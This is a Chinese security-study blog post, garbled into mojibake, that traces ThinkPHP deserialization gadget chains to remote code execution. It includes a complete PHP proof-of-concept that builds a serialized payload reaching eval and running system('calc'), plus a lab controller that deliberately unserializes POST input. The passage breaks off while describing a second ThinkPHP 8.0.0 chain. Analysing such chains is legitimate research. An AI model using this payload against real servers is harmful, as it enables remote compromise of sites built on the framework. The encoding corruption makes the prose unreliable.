è¿™é‡Œçš„$this-\u0026gt;loggerå¯æ§ï¼Œè°ƒç”¨ä»»æ„ç±»çš„save()æ–¹æ³•ï¼Œæˆ–è€…__call()æ–¹æ³•ï¼Œä½†æ˜¯è¿™é‡Œçš„é“¾å­è·Ÿçš„æ˜¯think\\log\\driver\\Socketç±»çš„save()æ–¹æ³•ï¼š\néœ€è¦check()å‡½æ•°è¿”å›trueï¼Œè·Ÿè¿›check()å‡½æ•°ï¼š\nè¿™é‡Œåªéœ€è¦æ§åˆ¶$this-\u0026gt;config['force_client_ids']ä¸ºtrueï¼Œ$this-\u0026gt;config['allow_client_ids']ä¸ºç©ºï¼Œæœ€åå°±ä¼šè¿”å›trueã€‚ï¼ˆps:å…³é”®ä»£ç é€»è¾‘å¤„ç†çœŸé‡è¦å‘€ï¼Œè‡ªå·±å…ˆçœ‹äº†ä¸€ä¸‹ï¼Œä¸€ç›´æ²¡æå–å‡ºæ¥é‡ç‚¹ï¼Œçœ‹äº†ä¸€ä¸‹å‚è€ƒæ–‡ç« ï¼Œè¿™é‡ç‚¹æŠ“å¾—æ˜¯çœŸå‡†å‘€ï¼Œåªéœ€è¦æ§åˆ¶è¿™å‡ ä¸ªå‚æ•°å°±å¯ä»¥ç›´æ¥è¾¾åˆ°ç›®çš„ï¼‰ã€‚\nè€Œå¯¹äºè¿™é‡Œå¾—configï¼Œå®šä¹‰å°±æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¦‚ä¸‹ï¼š\næœ€åæˆåŠŸé€šè¿‡check()å‡½æ•°ã€‚å›åˆ°save()å‡½æ•°ï¼Œé€šè¿‡æ§åˆ¶$this-\u0026gt;config['debug']ä¸ºtrueï¼Œä»è€Œè¿›å…¥åˆ°ifæ¡ä»¶ï¼š\nç„¶åè¿™é‡Œæ˜¯å°†$this-\u0026gt;appè®¾ç½®ä¸ºäº†think\\APPç±»ï¼Œä½†æ˜¯è¿™ä¸ªAPPç±»æ²¡æœ‰exists()æ–¹æ³•ï¼Œä¼šè°ƒç”¨åˆ°çˆ¶ç±»Containerå¾—exists()æ–¹æ³•ï¼š\nä»æ³¨é‡Šä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œå°±æ˜¯åœ¨åˆ¤æ–­å®¹å™¨ä¸­æ˜¯å¦æœ‰ç‹¬äº«å®ä¾‹ï¼Œå‚æ•°ä¼ é€’ä¸­å¯ä»¥çœ‹å‡ºè¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦æœ‰requestè¿™ä¸ªç±»çš„å®ä¾‹ï¼Œè·Ÿè¿›è¿™ä¸ªgetAlias()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 public function getAlias(string $abstract): string { if (isset($this-\u0026gt;bind[$abstract])) { $bind = $this-\u0026gt;bind[$abstract]; if (is_string($bind)) { return $this-\u0026gt;getAlias($bind); } } return $abstract; } å¯¹äºç¬¬ä¸€ä¸ªifè¯­å¥ï¼Œè·Ÿè¿›åˆ¤æ–­çš„$this-\u0026gt;bind[$abstract]ï¼Œç”±äºè¿™é‡Œçš„$thisè°ƒç”¨å…³ç³»ï¼Œè¿™é‡Œåˆ¤æ–­çš„æ˜¯Appç±»çš„bindå˜é‡ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯ç»‘å®šåˆ°æœ‰Request.classç±»çš„ï¼Œæ‰€ä»¥è¿™é‡Œçš„getAlias()æ–¹æ³•æœ€åæ˜¯ä¼šè¿”å›è¿™ä¸ªRequestç±»çš„å®Œå…¨åŒ…åï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›think\\Requestã€‚ç„¶åå›åˆ°exists()æ–¹æ³•ï¼Œä¼šåˆ¤æ–­æ˜¯å¦æœ‰å®ä¾‹åŒ–ç±»ï¼Œä¹Ÿå°±æ˜¯$this-\u0026gt;instance['think\\Request']è¦ä¸ºtrueï¼ŒåŒæ ·å¯ä»¥ç›´æ¥åœ¨ç±»åˆå§‹åŒ–æ—¶è®¾ç½®ï¼Œæ¯”å¦‚$this-\u0026gt;instanceèµ‹å€¼ä¸º['think\\Request'=\u0026gt;new Request()]ã€‚\næœ€åå›åˆ°Socketæ–‡ä»¶çš„save()æ–¹æ³•ï¼Œç„¶åå°±ä¼šè°ƒç”¨Requestç±»çš„url()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public function url(bool $complete = false): string { if ($this-\u0026gt;url) { $url = $this-\u0026gt;url; } elseif ($this-\u0026gt;server(\u0026#39;HTTP_X_REWRITE_URL\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;HTTP_X_REWRITE_URL\u0026#39;); } elseif ($this-\u0026gt;server(\u0026#39;REQUEST_URI\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;REQUEST_URI\u0026#39;); } elseif ($this-\u0026gt;server(\u0026#39;ORIG_PATH_INFO\u0026#39;)) { $url = $this-\u0026gt;server(\u0026#39;ORIG_PATH_INFO\u0026#39;) . (!empty($this-\u0026gt;server(\u0026#39;QUERY_STRING\u0026#39;)) ? \u0026#39;?\u0026#39; . $this-\u0026gt;server(\u0026#39;QUERY_STRING\u0026#39;) : \u0026#39;\u0026#39;); } elseif (isset($_SERVER[\u0026#39;argv\u0026#39;][1])) { $url = $_SERVER[\u0026#39;argv\u0026#39;][1]; } else { $url = \u0026#39;\u0026#39;; } return $complete ? $this-\u0026gt;domain() . $url : $url; } å¯ä»¥æ§åˆ¶urlå˜é‡ï¼Œæµ‹è¯•äº†ä¸€ä¸‹è¿™é‡Œçš„ifè¯­å¥ï¼Œåªè¦æœ‰ç»™$this-\u0026gt;urlèµ‹å€¼ï¼Œé‚£ä¹ˆè¿™é‡Œçš„ifè¯­å¥å°±ä¸ºçœŸï¼Œåˆ¤æ–­è§„åˆ™å¦‚ä¸‹ï¼š\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»™$urlèµ‹å€¼ä¸ºä»»æ„å€¼ã€‚\nåœ¨æœ€åçš„returnè¯­å¥ï¼Œç”±äºå‚æ•°çš„ä¼ é€’ï¼Œä¼šè°ƒç”¨$this-\u0026gt;domain()æ–¹æ³•ï¼Œç„¶åæ˜¯ä¸€ä¸ªæ‹¼æ¥urlå€¼å¾—æ“ä½œï¼Œè·Ÿè¿›ä¸€ä¸‹è¿™é‡Œå¾—domain()æ–¹æ³•ï¼š\n1 2 3 4 public function domain(bool $port = false): string { return $this-\u0026gt;scheme() . \u0026#39;://\u0026#39; . $this-\u0026gt;host($port); } è°ƒç”¨domain()æ–¹æ³•æ—¶æ²¡æœ‰ä¼ å‚ï¼Œæ‰€ä»¥è¿™é‡Œçš„$portä¸ºfalseï¼Œæ–¹æ³•å†…å®¹å°±æ˜¯è·å–åè®®å¤´å’ŒåŸŸåçš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯è·å–åŒ…å«å½“å‰åè®®çš„åŸŸåï¼Œä½†æ˜¯è¿™é‡Œä¼šç›´æ¥è¿”å›æˆ‘ä»¬å¯æ§çš„hostçš„å€¼ï¼Œä»£ç é€»è¾‘å¦‚ä¸‹ï¼š\nå‚æ•°ä¼ é€’ï¼Œä¼šè®©$strictå˜é‡è®¾ç½®ä¸ºfalseï¼Œåœ¨ä¸‰ç›®è¿ç®—ç¬¦ä¸­ä¼šå¾—åˆ°åé¢çš„é‚£ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯$hostçš„å€¼ã€‚\næœ€åè°ƒç”¨å®Œurl()å‡½æ•°è¿‡åï¼Œå›åˆ°save()æ–¹æ³•ï¼Œä¼šå°†è¿”å›çš„å€¼èµ‹å€¼ç»™$currentUriå˜é‡ï¼š\nç„¶åè¿™é‡Œåªè¦æ§åˆ¶$this-\u0026gt;config['format_head']ä¸ä¸ºç©ºï¼Œå°±å¯ä»¥è°ƒç”¨åˆ°think\\Appç±»çš„invoke()æ–¹æ³•ï¼Œè€Œè¿™ä¸ª$this-\u0026gt;config['format_head']ï¼ŒåŒæ ·æ˜¯å¯æ§çš„ï¼Œè€Œthink\\Appæ˜¯æ²¡æœ‰invoke()æ–¹æ³•çš„ï¼Œå…¶å®è¿˜æ˜¯è°ƒç”¨çš„çˆ¶ç±»Containerçš„invoke()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 public function invoke($callable, array $vars = [], bool $accessible = false) { if ($callable instanceof Closure) { return $this-\u0026gt;invokeFunction($callable, $vars); } elseif (is_string($callable) \u0026amp;\u0026amp; false === strpos($callable, \u0026#39;::\u0026#39;)) { return $this-\u0026gt;invokeFunction($callable, $vars); } else { return $this-\u0026gt;invokeMethod($callable, $vars, $accessible); } } ç„¶åé“¾å­æ˜¯çœ‹ç¬¬ä¸‰ä¸ªinvokeMethod()æ–¹æ³•ï¼š\nå‰é¢çš„åˆ†å‰²ç±»åå’Œæ–¹æ³•åçš„æ“ä½œï¼Œæœ€å¼€å§‹æˆ‘æœ¬æ¥æ˜¯æƒ³è¦ä½¿ç”¨elseä¸­çš„æ–¹æ³•æ¥è¿›è¡Œåˆ†å‰²çš„ï¼Œåé¢æ„é€ çš„æ—¶å€™å‘ç°æœ‰ç‚¹é—®é¢˜ï¼Œåªèƒ½è¢«è§£ææˆå­—ç¬¦ä¸²ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘ä¼ å‚æ ¼å¼æœ‰ç‚¹é—®é¢˜ï¼Œå…¶å®è¿™é‡Œä½¿ç”¨å‰é¢çš„ifè¯­å¥ä¸­çš„æ¡ä»¶æ‰æ˜¯æœ€å¥½ç”¨çš„ï¼Œç›´æ¥ç”¨ä¸€ä¸ªæ•°ç»„ä¼ å‚å³å¯ï¼Œå¹¶ä¸”è¿™é‡Œè¿˜æœ‰ä¸ªinvokeClass()æ–¹æ³•æ¥ç¡®ä¿æ˜¯ä¸€ä¸ªobejctå¯¹è±¡ã€‚ç„¶åçœ‹ä¸Šå›¾é‡ç‚¹æ ‡æ³¨å‡ºæ¥çš„éƒ¨åˆ†ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªåå°„æ“ä½œï¼Œå’Œjavaçš„å¾ˆåƒï¼Œåå°„è·å–ç±»åŠæ–¹æ³•ï¼Œç„¶ååŠ¨æ€æ‰§è¡Œã€‚\nåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰¾ä¸€ä¸‹æœ‰æ— ä»€ä¹ˆå‡½æ•°å¯ä»¥åŠ¨æ€è°ƒç”¨,å¯ä»¥ç”¨Seayæºä»£ç å®¡è®¡å·¥å…·è‡ªåŠ¨å®¡è®¡ä¸€ä¸‹ï¼š\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªdisplay()å‡½æ•°æ˜¯å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´çš„ï¼Œå­˜åœ¨think\\view\\driver\\Phpæ–‡ä»¶ä¸­ï¼Œç°åœ¨å°±æ˜¯çœ‹æ€ä¹ˆè¿›è¡Œå‚æ•°ä¼ é€’æ¥æ‰“äº†ï¼Œå‚æ•°ä¼ é€’æ„Ÿè§‰ä¹Ÿæ˜¯å¾ˆæœ‰æ„æ€çš„å‘€ï¼š\nåœ¨explode()å‡½æ•°ä¸­ä½¿ç”¨::æ¥åˆ†å‰²classå’Œmethodï¼Œæ„Ÿè§‰ä¼ å‚æ˜¯ï¼š\n1 2 a=new think\\view\\driver\\Php() a:: display è¿™æ ·ï¼Ÿæ„Ÿè§‰åƒæ˜¯ã€‚\nç„¶åå†ä½¿ç”¨ReflectionMethod()æ–¹æ³•æ¥åå°„è·å–åˆ°è¦è°ƒç”¨çš„æ–¹æ³•ï¼Œå†ç„¶åä½¿ç”¨bindParams()æ–¹æ³•æ¥ç»‘å®šå‚æ•°ï¼Œæœ€åè°ƒç”¨invokeArgs()æ¥æ‰§è¡Œè¿™ä¸ªæ–¹æ³•ã€‚\nè€Œåœ¨å‘½ä»¤æ‰§è¡Œæ˜¯å¦‚ä¸‹ï¼š\n1 eval(\u0026#39;?\u0026gt;\u0026#39; . $this-\u0026gt;content); å¦‚ä¸‹å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š\n1 2 3 4 \u0026lt;?php $content=\u0026#34;\\\u0026lt;?php system(\u0026#39;whoami\u0026#39;);?\u0026gt;\u0026#34;; eval(\u0026#39;?\u0026gt;\u0026#39; . $content); æ‰€ä»¥ä¼ å‚å°±éœ€è¦ä¼ \u0026lt;?php system('whoami');?\u0026gt;å³å¯ï¼Œè¿™é‡Œçš„å‚æ•°ä¼ é€’å…¶å®å°±æ˜¯å‰é¢$currentUriçš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥å°†å‰é¢çš„$urlè®¾ç½®ä¸ºphpä»£ç å³å¯ã€‚\næœ€åçš„POCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 \u0026lt;?php namespace League\\Flysystem\\Cached\\Storage; //abstract class AbstractCache //{ // protected $autosave = false; //} class Psr6Cache { private $pool; protected $autosave = false; function __construct($a){ $this-\u0026gt;pool=$a; } } namespace think\\log; class Channel{ protected $logger; protected $event; protected $lazy; function __construct($b){ $this-\u0026gt;lazy=false; $this-\u0026gt;event=false; $this-\u0026gt;logger=$b; } } namespace think\\view\\driver; class Php{ } namespace think\\log\\driver; class Socket{ protected $app; protected $config =[]; function __construct($b){ $this-\u0026gt;app=$b; $this-\u0026gt;config=[ \u0026#39;force_client_ids\u0026#39; =\u0026gt; true, \u0026#39;allow_client_ids\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;debug\u0026#39; =\u0026gt; true, \u0026#39;format_head\u0026#39; =\u0026gt; [new \\think\\view\\driver\\Php,\u0026#39;display\u0026#39;] ]; } } namespace think; class Request{ protected $url; function __construct(){ $this-\u0026gt;url=\u0026#34;\u0026lt;?php system(\u0026#39;calc\u0026#39;); ?\u0026gt;\u0026#34;; } } class App{ protected $instances = []; function __construct(){ $this-\u0026gt;instances=[ \u0026#39;think\\Request\u0026#39; =\u0026gt; new Request() ]; } } $d=new App; $b=new \\think\\log\\driver\\Socket($d); $a=new \\think\\log\\Channel($b); $c=new \\League\\Flysystem\\Cached\\Storage\\Psr6Cache($a); echo urlencode(base64_encode(serialize($c))); å…¶å®åŸºæœ¬é“¾å­çŸ¥é“äº†ï¼Œå°±å¯ä»¥ç›´æ¥æ„é€ å¥½ç±»ï¼Œç„¶åç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œå¦‚æœè¿˜æ˜¯æœ‰é—®é¢˜ï¼Œåœ¨è°ƒè¯•æ—¶å†ä¸€æ­¥ä¸€æ­¥ä¿®æ”¹ã€‚\næœ€åæ˜¯æˆåŠŸå¼¹å‡ºè®¡ç®—æœºçš„ï¼š\nä»é¡µé¢æ˜¾ç¤ºæ˜¯çŸ¥é“æœ‰å›æ˜¾çš„ã€‚æ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“æœ‰å›æ˜¾çš„å‘½ä»¤æ‰§è¡Œã€‚\né—®é¢˜è§£å†³ å‰é¢ç•™äº†ä¸€ä¸ªé—®é¢˜ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆä¼šé€‰æ‹©Psr6Cacheç±»çš„save()æ–¹æ³•ã€‚å…¶å®ä»æ•´ä¸ªæ„é€ è¿‡ç¨‹ä¸‹æ¥çœ‹ï¼Œå°±åŸºæœ¬ä¸Šå·²ç»æ‡‚äº†ã€‚é¦–å…ˆï¼Œé€‰ç”¨Psr6Cacheç±»æ˜¯å®Œç¾ç¬¦åˆé“¾å­çš„ï¼Œå…¶æ¬¡ï¼Œåœ¨javaçš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“åœ¨ååºåˆ—åŒ–ä¸€ä¸ªç±»æ—¶ï¼ŒåŒæ—¶è¿˜ä¼šååºåˆ—åŒ–å®ƒçš„çˆ¶ç±»ï¼Œè¿™æ ·å°±ä¼šè§¦å‘AbstractCacheç±»çš„__destrcut()æ–¹æ³•ï¼Œä»è€Œä½¿å¾—é“¾å­æ‰§è¡Œã€‚\nè€Œé¡µé¢å›æ˜¾çš„http://ï¼Œå…¶å®å°±æ˜¯é“¾å­ä¸­æ‹¼æ¥urlåçš„ç»“æœï¼Œä½†æ˜¯phpä»£ç è¢«æ‰§è¡Œäº†ï¼Œæ‰€ä»¥åªæœ‰è¿™ä¸ªå›æ˜¾ï¼š\nâ€”â€”â€”â€”\næ€»ç»“ ä»è¿™ä¸ªé“¾å­ä¸­ï¼Œå­¦åˆ°äº†å¾ˆå¤šï¼Œå…³é”®ä»£ç çš„æŠ“å–ã€å…³é”®ç±»çš„é€‰å–ã€‚ã€‚ã€‚\næ„Ÿè§‰æŒ–ä¸€æ¡é“¾å­çœŸçš„æ˜¯è¦çœ‹å¾ˆå¤šä»£ç å‘€ï¼Œå‡½æ•°è°ƒç”¨å½“ç„¶ä¸éš¾ï¼Œä½†æ˜¯è¦æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œè¿˜æ˜¯æ¯”è¾ƒèŠ±è€å¿ƒçš„ï¼Œinterstingï¼ŒæŸä¸¤ä¸ªæ–¹æ³•é…åˆèµ·æ¥å°±èƒ½æ‰“æˆä¸€æ¡é“¾å­ã€‚\nåŒæ—¶åœ¨è¿™é‡ŒçŸ¥é“ï¼Œå¯¹äºä¸€äº›æ¡†æ¶ï¼Œæœ‰äº›æ¼æ´ç‚¹çœŸå¯ä»¥å»github issueä¸Šçœ‹ï¼Œæˆ‘çœ‹è¿™æ¡é“¾å­çš„POCå°±æ˜¯åœ¨github issueä¸Šå¯ä»¥çœ‹åˆ°çš„ï¼Œå¯ä»¥çœ‹å‚è€ƒæ–‡ç« ã€‚\nå‚è€ƒæ–‡ç« ï¼š\nhttps://github.com/top-think/framework/issues/2749\nhttps://xz.aliyun.com/news/11615?time__1311=eqUxuQDtDQitqAKD%3DD%2FFn%2BCBKqGQqD9QnGoD\u0026u_atoken=d85375bd9b5b083adb46a87b18f126c7\u0026u_asig=1a0c399a17410911216675510e012d\nhttps://blog.csdn.net/qq_29920751/article/details/87630803\nhttps://blog.csdn.net/qq_21296205/article/details/128369757\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nThinkphpv8.0.0 ååºåˆ—åŒ–æ¼æ´ éœ€è¦ä½¿ç”¨php8ï¼Œæˆ‘è¿™é‡Œæ˜¯php8.2.9+thinkphp v8.0.0\nè¿™ä¸ªæ˜¯niviaå­¦é•¿åœ¨2024xctf finalå‡ºçš„é¢˜ï¼Œå½“æ—¶ä»–æ˜¯æŒ–å‡ºæ¥çš„0dayï¼Œè¿™é‡Œä¹Ÿæ˜¯æ¥å¤ç°ä¸€ä¸‹ã€‚\nâ€”â€”â€”â€”â€”â€”\nç¯å¢ƒæ­å»º ç¯å¢ƒæ­å»ºä¸€ä¸ªphp8çš„ç¯å¢ƒï¼Œå‚è€ƒä¹‹å‰å‘çš„æ­å»ºçš„php7çš„è°ƒè¯•ç¯å¢ƒæ•™ç¨‹ï¼Œå·®ä¸å¤šçš„ã€‚\nç„¶åä¸‹è½½æºç ï¼š\n1 composer create-project topthink/think=8.0.0 think-8.0.0 æ”¹composer.jsonæ–‡ä»¶çš„æ¡†æ¶ç‰ˆæœ¬ä¸ºæŒ‡å®šç‰ˆæœ¬8.0.0ï¼Œç„¶åè¿è¡Œcomposer updateæ›´æ–°ä¸€ä¸‹å³å¯ã€‚\næœ€åè®¿é—®æˆåŠŸæ­å»ºï¼š\nè¿™é‡Œè¿˜æ˜¯åœ¨app/controller/Indexé¡µé¢åŠ ä¸€ä¸ªå…¥å£å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php namespace app\\controller; use app\\BaseController; class Index extends BaseController { public function index() { unserialize(base64_decode($_POST[\u0026#39;a\u0026#39;])); return \u0026#39;\u0026lt;style\u0026gt;*{ padding: 0; margin: 0; }\u0026lt;/style\u0026gt;\u0026lt;iframe src=\u0026#34;https://www.thinkphp.cn/welcome?version=\u0026#39; . \\think\\facade\\App::version() . \u0026#39;\u0026#34; width=\u0026#34;100%\u0026#34; height=\u0026#34;100%\u0026#34; frameborder=\u0026#34;0\u0026#34; scrolling=\u0026#34;auto\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#39;; } public function hello($name = \u0026#39;ThinkPHP8\u0026#39;) { return \u0026#39;hello,\u0026#39; . $name; } } ç„¶åå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„ä»£ç å®¡è®¡äº†ã€‚\npsï¼šå¥½åƒè¿™æ¡é“¾å­ååŠéƒ¨åˆ†å’Œä¸€ä¸ªthinkphp6çš„å¾ˆåƒï¼Œå’Œæˆ‘å‰é¢å®¡çš„ä¸ä¸€æ ·ï¼Œç›´æ¥ä»è¿™é‡Œå­¦äº†ï¼Œä¸å†è¿”å›å»å®¡è®¡é‚£ä¸ªäº†ã€‚\nâ€”â€”â€”â€”â€”â€”\nä»£ç å®¡è®¡ åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°äº†ä¸€ä¸ªç‚¹ï¼Œä»£ç å®¡è®¡è¦é€‰å¥½sinkç‚¹å’Œsourceç‚¹ï¼Œç„¶ååœ¨æŒ–é“¾å­çš„è¿‡ç¨‹ä¸­å»é å³å¯ï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ã€‚\nâ€”â€”â€”â€”â€”â€”\nsourceç‚¹é€‰æ‹© ä¸€èˆ¬çš„sourceç‚¹å°±æ˜¯__destructæˆ–è€…__wakeupæ–¹æ³•ï¼Œç›´æ¥å…¨å±€æœç´¢__destructæ–¹æ³•ï¼Œæ‰¾åˆ°ä¸¤ä¸ªå¯ä»¥ä½¿ç”¨çš„ç‚¹ï¼š\nLeague\\Flysystem\\Cached\\Storage\\AbstractCacheï¼š\n1 2 3 4 5 6 public function __destruct() { if (! $this-\u0026gt;autosave) { $this-\u0026gt;save(); } } think\\route\\ResourceRegisterï¼š\n1 2 3 4 5 6 public function __destruct() { if (!$this-\u0026gt;registered) { $this-\u0026gt;register(); } } åœ¨è¿™é‡Œé€‰æ‹©çš„æ˜¯ç¬¬äºŒä¸ªã€‚\nsinkç‚¹é€‰æ‹© ä¸€èˆ¬æ¡†æ¶çš„ååºåˆ—åŒ–sinkç‚¹éƒ½ä¼šé€‰æ‹©callæ–¹æ³•ï¼Œå› ä¸ºä¸€èˆ¬å¯èƒ½çš„å±é™©æ“ä½œéƒ½åœ¨callæ–¹æ³•ä¸Šã€‚\nåœ¨è¿™é‡Œä½¿ç”¨çš„æ˜¯think\\Validate#__callï¼Œä»£ç é€»è¾‘å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 public function __call($method, $args) { if (\u0026#39;is\u0026#39; == strtolower(substr($method, 0, 2))) { $method = substr($method, 2); } array_push($args, lcfirst($method)); return call_user_func_array([$this, \u0026#39;is\u0026#39;], $args); } è¿™ä¸ªä»£ç é€»è¾‘ï¼Œå¦‚æœæƒ³è¦èƒ½å¤Ÿè¿›å…¥ifè¯­å¥ï¼Œéœ€è¦$methodåä¸ºç±»ä¼¼isevalè¿™ç§ï¼Œç„¶åå°±ä¼šæˆªå–ï¼Œå°†$methodçš„å€¼æ›´æ–°ä¸ºevalè¿™ç§ï¼Œæœ€åå°±è°ƒç”¨äº†call_user_func_array()æ–¹æ³•ï¼Œè¿™ä¸ªå‡½æ•°çš„è°ƒç”¨ä¹Ÿæ˜¯éå¸¸æœ‰æ„æ€ï¼Œç»™ä¸€ä¸ªä»£ç è¯´è¯´è¿™é‡Œçš„é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class Foo { function bar($arg, $arg2) { echo __METHOD__, \u0026#34; got $arg and $arg2\\n\u0026#34;; } } $foo = new Foo; call_user_func_array(array($foo, \u0026#34;bar\u0026#34;), array(\u0026#34;three\u0026#34;, \u0026#34;four\u0026#34;)); //output: Foo::bar got three and four å¯ä»¥çŸ¥é“ï¼Œè¿™é‡Œå°±æ˜¯è°ƒç”¨$fooå®ä¾‹çš„bar()å‡½æ•°ï¼Œé‚£ä¹ˆåŒæ ·çš„ï¼Œåœ¨åŸæ¥çš„payloadä¸Šï¼Œè¿™é‡Œå°±æ˜¯è°ƒç”¨$thisçš„is()å‡½æ•°ï¼Œå…¨å±€æœç´¢iså‡½æ•°ï¼Œå¾—åˆ°äº†å¦‚ä¸‹å‡½æ•°ï¼š\nåŒæ ·è¿˜æ˜¯think/Validateç±»çš„is()å‡½æ•°ï¼Œä»å›¾ä¸­å¯ä»¥çœ‹åˆ°æœ€åè¿™é‡Œçš„å‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œå¯ä»¥è¾¾åˆ°è°ƒç”¨å›è°ƒå‡½æ•°æ¥è¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„æ•ˆæœã€‚\nç°åœ¨sinkç‚¹å’Œsourceç‚¹éƒ½æ‰¾åˆ°äº†ï¼Œæ¥çœ‹ä¸€ä¸‹ä¸­é—´çš„é“¾å­ã€‚\né“¾å­å¯»æ‰¾ å…¥å£ç‚¹æ˜¯ think\\route\\ResourceRegisterç±»çš„__destructå‡½æ•°ï¼š\n1 2 3 4 5 6 public function __destruct() { if (!$this-\u0026gt;registered) { $this-\u0026gt;register(); } } $this-\u0026gt;registeredå˜é‡å¯æ§ï¼Œç„¶åå›è°ƒç”¨åˆ°register()æ–¹æ³•ï¼š\n1 2 3 4 5 6 protected function register() { $this-\u0026gt;registered = true; $this-\u0026gt;resource-\u0026gt;parseGroupRule($this-\u0026gt;resource-\u0026gt;getRule()); } å…¶å®è¿™é‡Œå°±èƒ½å°è¯•è°ƒç”¨__call()æ–¹æ³•ï¼Œä½†æ˜¯åœ¨å‰é¢æƒ³è¦è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ï¼Œæ˜¯éœ€è¦åœ¨è°ƒç”¨__call()æ–¹æ³•æ—¶æ˜¯éœ€è¦æœ‰å‚æ•°çš„ï¼Œä½†æ˜¯è¿™é‡Œçš„getRule()æ–¹æ³•æ˜¯æ— æ³•è¿›è¡Œä¼ å‚çš„ã€‚\nè¿˜æ˜¯ç›´æ¥è·Ÿè¿›ï¼Œè°ƒç”¨çš„getRule()æ–¹æ³•ä¼šè°ƒç”¨åˆ°Resource.phpæ–‡ä»¶çš„çˆ¶ç±»çš„çˆ¶ç±»Ruleç±»çš„getRule()æ–¹æ³•ï¼š\n1 2 3 4 public function getRule() { return $this-\u0026gt;rule; } æ‰€ä»¥è¿™é‡Œçš„å‚æ•°æ˜¯å¯æ§çš„ã€‚\nç„¶åçœ‹ä¸€ä¸‹parseGroupRule()æ–¹æ³•ï¼Œä¼šè°ƒç”¨åˆ°Resource.phpæ–‡ä»¶çš„parseGroupRule()æ–¹æ³•ï¼š\nå¦‚ä¸Šå›¾ï¼Œé€šè¿‡å‚æ•°çš„æ§åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è¿‡ç¬¬ä¸€ä¸ªifè¯­å¥çš„æ‰§è¡Œï¼Œç›´æ¥æ‰§è¡Œåé¢çš„ä»£ç ï¼Œç„¶åçœ‹ç¬¬äºŒä¸ªæ¡†å‡ºæ¥çš„éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹è§å¾ˆæ˜æ˜¾çš„æ‹¼æ¥æ“ä½œï¼Œè¿™é‡Œæ˜¯å¯ä»¥å°è¯•è°ƒç”¨toStringé“¾çš„ï¼Œè¿™é‡Œå†ç®€å•çœ‹ä¸€ä¸‹è¿™é‡Œçš„å‚æ•°æƒ…å†µï¼Œçœ‹æ˜¯å¦å¯ä»¥æ§åˆ¶ï¼Œå®¡è®¡äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œå…·ä½“å°±çœ‹åé¢çš„POCå§ï¼Œç»§ç»­æ‰¾é“¾å­ã€‚ã€‚\nç°åœ¨å°±æ˜¯éœ€è¦å»æ‰¾è°ƒç”¨toString()é“¾å­ï¼Œè¿™é‡Œé€‰ç”¨çš„æ˜¯think\\model\\concern\\Conversionç±»çš„__toString()é“¾ï¼š\nè·Ÿè¿›è¿™ä¸ªtoJson()ï¼š\nç„¶åè°ƒç”¨toArray()ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public function toArray(): array { $item = $visible = $hidden = []; $hasVisible = false; foreach ($this-\u0026gt;visible as $key =\u0026gt; $val) { if (is_string($val)) { if (str_contains($val, \u0026#39;.\u0026#39;)) { [$relation, $name] = explode(\u0026#39;.\u0026#39;, $val); $visible[$relation][] = $name; } else { $visible[$val] = true; $hasVisible = true; } } else { $visible[$key] = $val; } } foreach ($this-\u0026gt;hidden as $key =\u0026gt; $val) { if (is_string($val)) { if (str_contains($val, \u0026#39;.\u0026#39;)) { [$relation, $name] = explode(\u0026#39;.\u0026#39;, $val); $hidden[$relation][] = $name; } else { $hidden[$val] = true; } } else { $hidden[$key] = $val; } } // è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰ foreach ($this-\u0026gt;append as $key 